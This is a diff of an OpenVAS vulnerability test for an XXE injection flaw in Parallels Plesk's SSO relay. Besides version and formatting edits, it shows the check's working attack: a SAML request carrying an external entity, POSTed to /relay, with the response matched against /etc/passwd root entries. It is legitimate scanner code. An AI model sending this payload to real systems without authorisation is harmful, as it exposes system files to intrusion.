@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_plesk_xxe_06_13.nasl 11108 2018-08-24 14:27:07Z mmartin $
+# $Id: gb_plesk_xxe_06_13.nasl 11222 2018-09-04 12:41:44Z cfischer $
 #
 # Plesk XXE Injection Vulnerability
 #
@@ -27,10 +27,10 @@
 
 CPE = "cpe:/a:parallels:parallels_plesk_panel";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105046");
-  script_version("$Revision: 11108 $");
+  script_version("$Revision: 11222 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
 
@@ -38,7 +38,7 @@ if (description)
 
   script_xref(name:"URL", value:"http://makthepla.net/blog/=/plesk-sso-xxe-xss");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-06-13 14:56:42 +0200 (Fri, 13 Jun 2014)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -53,11 +53,11 @@ if (description)
   script_tag(name:"solution", value:"Ask the vendor for an update.");
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"summary", value:"Plesk is prone to a XXE Vulnerability.");
-  script_tag(name:"affected", value:"Plesk versions 10.4.4 and 11.0.9; other versions may also be affected.");
+  script_tag(name:"affected", value:"Plesk versions 10.4.4 and 11.0.9. Other versions may also be affected.");
 
   script_tag(name:"qod_type", value:"remote_app");
 
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
@@ -74,7 +74,7 @@ xxe = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE doc [ <!
       '<saml:Issuer>&xxe;</saml:Issuer></samlp:AuthnRequest>';
 
 xxe = urlencode( str:base64( str:xxe ) );
-
+useragent = get_http_user_agent();
 host = http_host_name(port:port);
 
 rs = urlencode( str:base64( str:get_host_ip() ) );
@@ -84,7 +84,7 @@ ex = 'SAMLRequest=' + xxe  + '&response_url=http://OpenVAS&RelayState=' + rs  + 
 len = strlen( ex );
 
 req = 'POST /relay HTTP/1.1\r\n' +
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+      'User-Agent: ' + useragent + '\r\n' +
       'Host: ' + host + '\r\n' +
       'Accept: */*\r\n' +
       'Referer: https://' + host + '/relay\r\n' +
@@ -92,7 +92,6 @@ req = 'POST /relay HTTP/1.1\r\n' +
       'Content-Type: application/x-www-form-urlencoded\r\n' +
       '\r\n' +
       ex;
-
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
 if( buf =~ 'root:.*:0:[01]:' )
@@ -102,4 +101,3 @@ if( buf =~ 'root:.*:0:[01]:' )
 }
 
 exit( 99 );
-
